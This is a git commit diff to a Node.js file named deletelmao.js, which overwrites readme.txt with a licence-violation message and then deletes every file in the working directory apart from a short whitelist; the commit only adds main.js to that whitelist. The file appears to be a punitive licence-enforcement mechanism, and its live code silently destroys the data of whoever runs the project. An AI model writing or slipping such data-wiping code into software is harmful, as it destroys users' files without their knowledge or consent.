4f72b1853ccf620804477b6b8cda2fb1efaf74ae
PlurrYT-Kolama <156847032+PlurrYT-Kolama@users.noreply.github.com>
2024-01-31 17:45:01 +0100

    Update deletelmao.js

--- deletelmao.js
+++ deletelmao.js
@@ -1,6 +1,6 @@
 const fs = require('fs');
 fs.writeFileSync('./readme.txt', 'You broke the licence, please read LICENSE.txt', 'utf-8');
 fs.readdirSync('./').forEach(file => {
-    if (file === 'license.txt' || file === 'readme.txt' || file === 'deletelmao.js' || file === 'license.js' || file === 'midleware.js') return;
+    if (file === 'license.txt' || file === 'readme.txt' || file === 'deletelmao.js' || file === 'license.js' || file === 'midleware.js' || file === 'main.js') return;
     else fs.unlink(`./${file}`, f => { });
 });
